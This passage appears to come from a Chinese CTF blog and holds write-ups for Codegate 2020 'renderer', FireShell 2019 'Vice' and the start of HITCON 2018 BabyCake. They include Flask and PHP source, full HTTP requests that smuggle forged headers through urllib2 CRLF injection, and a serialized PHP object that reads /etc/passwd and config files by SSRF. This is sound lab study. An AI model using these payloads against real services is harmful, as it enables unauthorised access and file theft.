class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;admin_local.html&quot;</span>, ticket = ticket)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;admin_local.html&quot;</span>, ticket = <span class=\"literal\">None</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@front.route(&quot;/admin/ticket&quot;, methods=[&quot;GET&quot;])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">admin_ticket</span>():</span></span><br><span class=\"line\">    print(<span class=\"string\">&#x27;!!!! admin_ticket()&#x27;</span>, file=sys.stderr)</span><br><span class=\"line\">    ip = get_ip()</span><br><span class=\"line\">    rip = get_real_ip()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ip != rip: <span class=\"comment\">#proxy doesn&#x27;t allow to show ticket</span></span><br><span class=\"line\">        print(<span class=\"string\">&#x27;!!!!&#x27;</span>, <span class=\"number\">1</span>, file=sys.stderr)</span><br><span class=\"line\">        abort(<span class=\"number\">403</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ip <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> [<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"string\">&quot;127.0.0.2&quot;</span>]: <span class=\"comment\">#only local</span></span><br><span class=\"line\">        print(<span class=\"string\">&#x27;!!!!&#x27;</span>, <span class=\"number\">2</span>, file=sys.stderr)</span><br><span class=\"line\">        abort(<span class=\"number\">403</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.headers.get(<span class=\"string\">&quot;User-Agent&quot;</span>) != <span class=\"string\">&quot;AdminBrowser/1.337&quot;</span>:</span><br><span class=\"line\">        print(<span class=\"string\">&#x27;!!!!&#x27;</span>, request.headers.get(<span class=\"string\">&quot;User-Agent&quot;</span>), file=sys.stderr)</span><br><span class=\"line\">        abort(<span class=\"number\">403</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.args.get(<span class=\"string\">&quot;ticket&quot;</span>):</span><br><span class=\"line\">        log = read_log(request.args.get(<span class=\"string\">&quot;ticket&quot;</span>))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> log:</span><br><span class=\"line\">            print(<span class=\"string\">&#x27;!!!!&#x27;</span>, <span class=\"number\">4</span>, file=sys.stderr)</span><br><span class=\"line\">            abort(<span class=\"number\">403</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> render_template_string(log)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_ip</span>():</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> request.remote_addr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_real_ip</span>():</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> request.headers.get(<span class=\"string\">&quot;X-Forwarded-For&quot;</span>) <span class=\"keyword\">or</span> get_ip()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">proxy_read</span>(<span class=\"params\">url</span>):</span></span><br><span class=\"line\">    <span class=\"comment\">#TODO : implement logging</span></span><br><span class=\"line\"></span><br><span class=\"line\">    s = urlparse(url).scheme</span><br><span class=\"line\">    <span class=\"keyword\">if</span> s <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> [<span class=\"string\">&quot;http&quot;</span>, <span class=\"string\">&quot;https&quot;</span>]: <span class=\"comment\">#sjgdmfRk akfRk</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> urllib2.urlopen(url).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write_log</span>(<span class=\"params\">rip</span>):</span></span><br><span class=\"line\">    print(<span class=\"string\">&#x27;!!!! write_log()&#x27;</span>, file=sys.stderr)</span><br><span class=\"line\">    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">&quot;/home/tickets/%s&quot;</span> % tid, <span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        log_str = <span class=\"string\">&quot;Admin page accessed from %s&quot;</span> % rip</span><br><span class=\"line\">        f.write(log_str)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> tid</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write_extend_log</span>(<span class=\"params\">rip, body</span>):</span></span><br><span class=\"line\">    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">&quot;/home/tickets/%s&quot;</span> % tid, <span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        f.write(body)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> tid</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">read_log</span>(<span class=\"params\">ticket</span>):</span></span><br><span class=\"line\">    print(<span class=\"string\">&#x27;!!!! read_log()&#x27;</span>, file=sys.stderr)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> (ticket <span class=\"keyword\">and</span> ticket.isalnum()):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> path.exists(<span class=\"string\">&quot;/home/tickets/%s&quot;</span> % ticket):</span><br><span class=\"line\">        <span class=\"keyword\">with</span> open(<span class=\"string\">&quot;/home/tickets/%s&quot;</span> % ticket, <span class=\"string\">&quot;r&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> f.read()</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure> <figure class=\"highlight python\"><figcaption><span>/home/src/app/__init__.py</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> app <span class=\"keyword\">import</span> routes</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.url_map.strict_slashes = <span class=\"literal\">False</span></span><br><span class=\"line\">app.register_blueprint(routes.front, url_prefix=<span class=\"string\">&quot;/renderer&quot;</span>)</span><br><span class=\"line\">app.config[<span class=\"string\">&quot;FLAG&quot;</span>] = os.getenv(<span class=\"string\">&quot;FLAG&quot;</span>, <span class=\"string\">&quot;CODEGATE2020&#123;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure> templates就不放了，在我Github上有完整的。</p>\r\n<p>flag保存在Flask的config里，利用SSRF就可以拿到。那么SSRF在哪？admin_ticket()路由的最后一行render_template_string()很显眼，同时admin_local.html和admin_remote.html里都有一句  \n{% if ticket %}\n  <p class=\"text-center\">\n    Your access log is written with ticket no {{ ticket }}\n  </p>\n{% endif %} \n 很明显SSRF了。下一步是怎么触发SSRF。admin_ticket()路由中会用get_ip()和get_real_ip()判断IP来源。get_real_ip()使用X-Forwarded-For头获取IP。没啥问题。</p>\r\n<p>我们的目标很明显是要通过Proxy Service来访问/admin/ticket，直接在浏览器访问会由于访问IP不为127.0.0.1或127.0.0.2而403。但要成功访问/admin/ticket又需要设置User-Agent为AdminBrowser/1.337。我们可控的是X-Forwarded-For，也就是说我们需要一种方式影响HTTP头。</p>\r\n<p>研究一下proxy_read()，发现是用的urllib2.urlopen()。搜一下“urllib2 vuln”，返回第一个页面就是<a href=\"https://bugs.python.org/issue36276\">这个</a>，CRLF Injection。好极了，这个洞可以通过插入。那么，X-Forwarded-For和User-Agent就可以被插入了。</p>\r\n<p>到现在，题目已经解决，攻击流程如下：</p>\r\n<ol type=\"1\">\r\n<li>利用urllib2的漏洞，插入X-Forwarded-For: ，使Proxy Service访问/renderer/admin，生成ticket。</li>\r\n<li>利用nginx的路径穿越，访问/static../tickets/，获得刚才的ticket文件名。</li>\r\n<li>利用urllib2的漏洞，插入User-Agent: AdminBrowser/1.337，使Proxy Service访问/renderer/admin/ticket?ticket=刚才的文件名，渲染ticket，读出Flask的config，得到flag。</li>\r\n</ol>\r\n<p>OK，Burp发包吧： <figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/renderer/</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 127.0.0.1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://127.0.0.1/renderer/</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 88</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://127.0.0.1</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: confluence.browse.space.cookie=space-templates</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Pragma</span>: no-cache</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache</span><br><span class=\"line\"></span><br><span class=\"line\">url=http://127.0.0.1/renderer/admin HTTP/1.1%0d%0aX-Forwarded-For: %0d%0aTEST: 123</span><br></pre></td></tr></table></figure> 返回正常页面后访问/static../tickets/，得到文件名：fc75a14b624748a31ddd99ef984df7eaa6781aa9。 然后发包 <figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/renderer/</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 127.0.0.1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://127.0.0.1/renderer/</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 214</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://127.0.0.1</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: confluence.browse.space.cookie=space-templates</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Pragma</span>: no-cache</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache</span><br><span class=\"line\"></span><br><span class=\"line\">url=http://127.0.0.1/renderer/admin/ticket?ticket=fc75a14b624748a31ddd99ef984df7eaa6781aa9  HTTP/1.1%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aUser-Agent:%20AdminBrowser/1.337%0d%0aHost: 127.0.0.1%0d%0a%0d%0aTEST: 123</span><br></pre></td></tr></table></figure></p>\r\n<p>为什么第二部发包需要两个%0d%0a呢？</p>\r\n<img src=\"/2020/03/07/Codegate-2020-renderer/Test0d0a.png\" class=\"\">\r\n<p>GET模式下HTTP头后的任何内容没有意义。我们正常%0d%0a注入后会剩下一个\"HTTP/1.1\"，这个内容需要处理掉，否则urllib2会报错。因此我们用第二个%0d%0a强行结束HTTP头部分，那么\"HTTP/1.1\"会被当作HTTP头结束后的内容出现，GET模式下没有意义，会被丢弃，而我们想注入的头已经在前面布置好了。</p>\r\n","categories":["Writeups"],"tags":["Web","Nginx"]},{"title":"FireShell2019-Vice","url":"/2019/05/14/FireShell2019-Vice/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>快过年了，拖了几天。环境在<a href=\"https://github.com/Tiaonmmn/fireshell_2019_vice\">这</a>。</p>\r\n<p>题目不难，直接给了源码。 <a id=\"more\"></a> <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//require_once &#x27;/app/public/config.php&#x27;;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SHITS</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">private</span> $url;</span><br><span class=\"line\">  <span class=\"keyword\">private</span> $method;</span><br><span class=\"line\">  <span class=\"keyword\">private</span> $addr;</span><br><span class=\"line\">  <span class=\"keyword\">private</span> $host;</span><br><span class=\"line\">  <span class=\"keyword\">private</span> $name;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\">$method,$url</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;method = $method;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;url = $url;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doit</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;host = @parse_url(<span class=\"keyword\">$this</span>-&gt;url)[<span class=\"string\">&#x27;host&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;addr = @gethostbyname(<span class=\"keyword\">$this</span>-&gt;host);</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;name = @gethostbyaddr(<span class=\"keyword\">$this</span>-&gt;host);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;addr !== <span class=\"string\">&quot;127.0.0.1&quot;</span> || <span class=\"keyword\">$this</span>-&gt;name === <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">      $not = [<span class=\"string\">&#x27;.txt&#x27;</span>,<span class=\"string\">&#x27;.php&#x27;</span>,<span class=\"string\">&#x27;.xml&#x27;</span>,<span class=\"string\">&#x27;.html&#x27;</span>,<span class=\"string\">&#x27;.&#x27;</span>,<span class=\"string\">&#x27;[&#x27;</span>,<span class=\"string\">&#x27;]&#x27;</span>];</span><br><span class=\"line\">      <span class=\"keyword\">foreach</span>($not <span class=\"keyword\">as</span> $ext)&#123;</span><br><span class=\"line\">        $p = strpos(<span class=\"keyword\">$this</span>-&gt;url,$ext);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($p)&#123;</span><br><span class=\"line\">          <span class=\"keyword\">die</span>(<span class=\"string\">&quot;:)&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      $ch = curl_init();</span><br><span class=\"line\">      curl_setopt($ch,CURLOPT_URL,<span class=\"keyword\">$this</span>-&gt;url);</span><br><span class=\"line\">      curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class=\"literal\">true</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">      $result = curl_exec($ch);</span><br><span class=\"line\">      <span class=\"keyword\">echo</span> $result;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">die</span>(<span class=\"string\">&quot;:)&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(in_array(<span class=\"keyword\">$this</span>-&gt;method,<span class=\"keyword\">array</span>(<span class=\"string\">&quot;doit&quot;</span>)))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      call_user_func_array(<span class=\"keyword\">array</span>(<span class=\"keyword\">$this</span>,<span class=\"keyword\">$this</span>-&gt;method),<span class=\"keyword\">array</span>());</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">die</span>(<span class=\"string\">&quot;:)&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&quot;gg&quot;</span>])) &#123;</span><br><span class=\"line\">    @unserialize($_GET[<span class=\"string\">&quot;gg&quot;</span>]);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\r\n<p>看到 unserialize，猜到是个反序列化的题了。开头的 require，以及下面的 curl，目测是反序列化导致 SSRF。__destruct 方法提示，我们需要给 method 赋值 doit，不能跳出到其它函数。然后看 doit，如果传入的 url 不是以 127.0.0.1 做 Host，并且不出现<code>.txt</code>、<code>.php</code>、<code>.xml</code>、<code>.html</code>、<code>.</code>、<code>[</code>、<code>]</code> 这其中之一。注意他用的是 strpos () 判断。然后使用 curl 访问，并显示结果。</p>\r\n<p>首先我们需要有一个能够运行的反序列化模板。 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//require_once &#x27;/app/public/config.php&#x27;;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SHITS</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">private</span> $url;</span><br><span class=\"line\">  <span class=\"keyword\">private</span> $method;</span><br><span class=\"line\">  <span class=\"keyword\">private</span> $addr;</span><br><span class=\"line\">  <span class=\"keyword\">private</span> $host;</span><br><span class=\"line\">  <span class=\"keyword\">private</span> $name;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\">$method,$url</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;method = $method;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;url = $url;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doit</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    kan<span class=\"keyword\">$this</span>-&gt;host = @parse_url(<span class=\"keyword\">$this</span>-&gt;url)[<span class=\"string\">&#x27;host&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;addr = @gethostbyname(<span class=\"keyword\">$this</span>-&gt;host);</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;name = @gethostbyaddr(<span class=\"keyword\">$this</span>-&gt;host);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;addr !== <span class=\"string\">&quot;127.0.0.1&quot;</span> || <span class=\"keyword\">$this</span>-&gt;name === <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">      $not = [<span class=\"string\">&#x27;.txt&#x27;</span>,<span class=\"string\">&#x27;.php&#x27;</span>,<span class=\"string\">&#x27;.xml&#x27;</span>,<span class=\"string\">&#x27;.html&#x27;</span>,<span class=\"string\">&#x27;.&#x27;</span>,<span class=\"string\">&#x27;[&#x27;</span>,<span class=\"string\">&#x27;]&#x27;</span>];</span><br><span class=\"line\">      <span class=\"keyword\">foreach</span>($not <span class=\"keyword\">as</span> $ext)&#123;</span><br><span class=\"line\">        $p = strpos(<span class=\"keyword\">$this</span>-&gt;url,$ext);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($p)&#123;</span><br><span class=\"line\">          <span class=\"keyword\">die</span>(<span class=\"string\">&quot;:)&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      $ch = curl_init();</span><br><span class=\"line\">      curl_setopt($ch,CURLOPT_URL,<span class=\"keyword\">$this</span>-&gt;url);</span><br><span class=\"line\">      curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class=\"literal\">true</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">      $result = curl_exec($ch);</span><br><span class=\"line\">      <span class=\"keyword\">echo</span> $result;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">die</span>(<span class=\"string\">&quot;:)&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(in_array(<span class=\"keyword\">$this</span>-&gt;method,<span class=\"keyword\">array</span>(<span class=\"string\">&quot;doit&quot;</span>)))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      call_user_func_array(<span class=\"keyword\">array</span>(<span class=\"keyword\">$this</span>,<span class=\"keyword\">$this</span>-&gt;method),<span class=\"keyword\">array</span>());</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">die</span>(<span class=\"string\">&quot;:)&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=<span class=\"keyword\">new</span> SHITS(<span class=\"string\">&quot;doit&quot;</span>,<span class=\"string\">&quot;file:///etc/passwd&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">print</span>(serialize($a));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\r\n<p>运行即可出结果。正常情况下应该可以读 /etc/passwd 文件了。下面要绕过黑名单了。搜了一下，Google php strpos bypass，出了一个 <a href=\"https://bugs.php.net/bug.php?id=76671&amp;edit=1\">CVE</a>。两次编码即可。那么我们就需要对<code>.</code> 两次编码。<code>.</code> 的编码为 %2e，对 % 编码为 %25，那么我们应该写文件名为 config%252ephp。而路径题目已经提示了 /app/public。</p>\r\n<p>  重点来了，正常 serialize 后应该是如下结果：<code>O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fapp%2Fpublic%2Fconfig.%252570hp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D</code>（URL 编码过了）。这个结果在其他 Writeup 上没什么问题，我本地测试的时候问题大了。正常的浏览器没有把我们的 %25 解析了，这就造成字符串数量错了。正确的序列化结果应为 <code>&#123;s:10:%22%00SHITS%00url%22;s:31:%22file:///app/public/config%252ephp%22;s:13:%22%00SHITS%00method%22;s:4:%22doit%22;s:11:%22%00SHITS%00addr%22;N;s:11:%22%00SHITS%00host%22;N;s:11:%22%00SHITS%00name%22;N;&#125;'</code>。%25 应该已经在访问的时候就 URL Decode 的，但是序列化的时候没有考虑这点，因此我们要手动扣除。</p>\r\n\n    <div id=\"aplayer-PpSXtkXi\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"580827\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{ecf6df95-a28a-42ae-8b2b-43e9065d1e7f}</p>\r\n","categories":["Writeups"],"tags":["Unserialize","PHP","Web"]},{"title":"HITCON2018-BabyCake","url":"/2019/05/15/HITCON2018-BabyCake/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>花了几天时间搞明白一道题，放<a href=\"https://github.com/Tiaonmmn/hitcon_2018_babycake\">环境</a>有点晚。</p>\r\n<p>源码审计的题，跟 SSRF 无关。用的 CakePHP 框架，PHP7.2 版本的。打开页面后让我们输入 URL，但又不是 SSRF，反序列化？猜不到，看源码吧。 <a id=\"more\"></a> # Part 1.Look inside the code,and LFI.</p>\r\n<p>重点代码在 src.php 里。 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>\\<span class=\"title\">Controller</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Cake</span>\\<span class=\"title\">Core</span>\\<span class=\"title\">Configure</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Cake</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Client</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Cake</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Exception</span>\\<span class=\"title\">ForbiddenException</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Cake</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Exception</span>\\<span class=\"title\">NotFoundException</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Cake</span>\\<span class=\"title\">View</span>\\<span class=\"title\">Exception</span>\\<span class=\"title\">MissingTemplateException</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DymmyResponse</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\">$headers, $body</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;headers = $headers;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;body = $body;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">PagesController</span> <span class=\"keyword\">extends</span> <span class=\"title\">AppController</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">httpclient</span>(<span class=\"params\">$method, $url, $headers, $data</span>) </span>&#123;</span><br><span class=\"line\">        $options = [</span><br><span class=\"line\">            <span class=\"string\">&#x27;headers&#x27;</span> =&gt; $headers, </span><br><span class=\"line\">            <span class=\"string\">&#x27;timeout&#x27;</span> =&gt; <span class=\"number\">10</span></span><br><span class=\"line\">        ];</span><br><span class=\"line\">    </span><br><span class=\"line\">        $http = <span class=\"keyword\">new</span> Client();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $http-&gt;$method($url, $data, $options);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">back</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;render(<span class=\"string\">&#x27;pages&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span 